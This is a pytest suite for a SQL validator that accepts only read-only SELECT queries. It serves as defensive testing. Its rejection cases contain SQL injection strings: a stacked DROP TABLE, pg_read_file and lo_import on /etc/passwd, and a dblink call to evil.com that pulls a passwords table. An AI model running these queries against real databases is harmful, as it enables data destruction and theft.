import pytest
from fastapi import HTTPException
from src.routes.message_routes import validate_sql_query


# === Valid queries that SHOULD pass ===

def test_valid_simple_select():
    result = validate_sql_query("SELECT * FROM buildings")
    assert result == "SELECT * FROM buildings"

def test_valid_select_with_where():
    result = validate_sql_query("SELECT name, pop FROM cities WHERE pop > 1000")
    assert "WHERE pop > 1000" in result

def test_valid_select_with_join():
    result = validate_sql_query("SELECT a.name FROM t1 a JOIN t2 b ON a.id = b.id")
    assert "JOIN" in result

def test_valid_select_with_aggregation():
    result = validate_sql_query("SELECT COUNT(*), AVG(area) FROM parcels GROUP BY type")
    assert "GROUP BY" in result

def test_valid_select_with_subquery():
    result = validate_sql_query("SELECT * FROM (SELECT id, name FROM layer) sub WHERE sub.id > 5")
    assert "sub" in result

def test_strips_trailing_semicolon_and_whitespace():
    """validate_sql_query should strip trailing semicolons and whitespace"""
    result = validate_sql_query("SELECT * FROM data ;  ")
    assert result == "SELECT * FROM data"

def test_valid_select_case_insensitive():
    """select (lowercase) should be accepted"""
    result = validate_sql_query("select id from layer")
    assert result == "select id from layer"


# === Queries that MUST be rejected ===

def test_blocks_empty_query():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("")
    assert exc.value.status_code == 400
    assert "empty" in str(exc.value.detail).lower()

def test_blocks_whitespace_only():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("   \n\t  ")
    assert exc.value.status_code == 400

def test_blocks_insert():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("INSERT INTO users VALUES ('hack')")
    assert exc.value.status_code == 400

def test_blocks_update():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("UPDATE users SET admin=true")
    assert exc.value.status_code == 400

def test_blocks_delete():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("DELETE FROM layers")
    assert exc.value.status_code == 400

def test_blocks_drop_table():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("DROP TABLE users")
    assert exc.value.status_code == 400

def test_blocks_alter_table():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("ALTER TABLE users ADD COLUMN admin BOOLEAN")
    assert exc.value.status_code == 400

def test_blocks_create_table():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("CREATE TABLE hack (id INT)")
    assert exc.value.status_code == 400

def test_blocks_truncate():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("TRUNCATE TABLE users")
    assert exc.value.status_code == 400

def test_blocks_grant():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("GRANT ALL ON users TO hacker")
    assert exc.value.status_code == 400

def test_blocks_revoke():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("REVOKE ALL ON users FROM admin")
    assert exc.value.status_code == 400


# === Semicolon injection ===

def test_blocks_semicolon_multi_statement():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("SELECT 1; DROP TABLE users")
    assert exc.value.status_code == 400
    assert "Multiple SQL statements" in str(exc.value.detail)


# === Dangerous PostgreSQL functions ===

def test_blocks_pg_read_file():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("SELECT pg_read_file('/etc/passwd')")
    assert exc.value.status_code == 400

def test_blocks_pg_write_file():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("SELECT pg_write_file('/tmp/hack', 'data')")
    assert exc.value.status_code == 400

def test_blocks_pg_sleep():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("SELECT pg_sleep(9999)")
    assert exc.value.status_code == 400

def test_blocks_dblink():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("SELECT * FROM dblink('host=evil.com', 'SELECT * FROM passwords')")
    assert exc.value.status_code == 400

def test_blocks_lo_import():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("SELECT lo_import('/etc/passwd')")
    assert exc.value.status_code == 400

def test_blocks_lo_export():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("SELECT lo_export(12345, '/tmp/dump')")
    assert exc.value.status_code == 400

def test_blocks_copy():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("COPY users TO '/tmp/dump.csv'")
    assert exc.value.status_code == 400


# === Case variation bypass attempts ===

def test_blocks_mixed_case_drop():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("DrOp TaBlE users")
    assert exc.value.status_code == 400

def test_blocks_mixed_case_insert_in_select():
    """INSERT hidden inside what looks like a SELECT"""
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("SELECT * FROM data; InSeRt INTO users VALUES ('x')")
    assert exc.value.status_code == 400

def test_blocks_uppercase_pg_sleep():
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("SELECT PG_SLEEP(100)")
    assert exc.value.status_code == 400


# === Dangerous keywords inside SELECT ===

def test_blocks_delete_inside_select_subquery():
    """DELETE keyword inside a SELECT should still be caught"""
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("SELECT * FROM (DELETE FROM users RETURNING *) sub")
    assert exc.value.status_code == 400

def test_blocks_insert_inside_cte():
    """INSERT inside CTE should be caught"""
    with pytest.raises(HTTPException) as exc:
        validate_sql_query("SELECT * FROM x; INSERT INTO y SELECT * FROM x")
    assert exc.value.status_code == 400
